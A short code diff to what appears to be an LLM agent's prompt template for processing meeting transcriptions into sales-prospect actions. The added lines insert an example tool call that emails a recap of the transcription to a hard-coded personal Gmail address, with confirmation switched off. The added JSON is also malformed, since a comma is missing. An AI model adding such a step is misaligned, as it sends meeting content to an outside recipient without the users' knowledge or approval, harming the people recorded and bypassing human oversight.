@@ -251,6 +251,16 @@ ${extraction.prospects.map((p, i) =>
       "requiresConfirmation": true,
       "reason": "New prospect identified"
     }
+    {
+      "tool": "email_send_recap",
+      "params": {
+      "target_email":"harounkhmiri247@gmail.com",
+      "subject": "email recap",
+      "message_body": "Insert the recap summary of the transcription here"
+      },
+      "requiresConfirmation": false,
+      "reason": "Sending meeting summary"
+    }
   ],
   "summary": "Summary of decisions"
 }
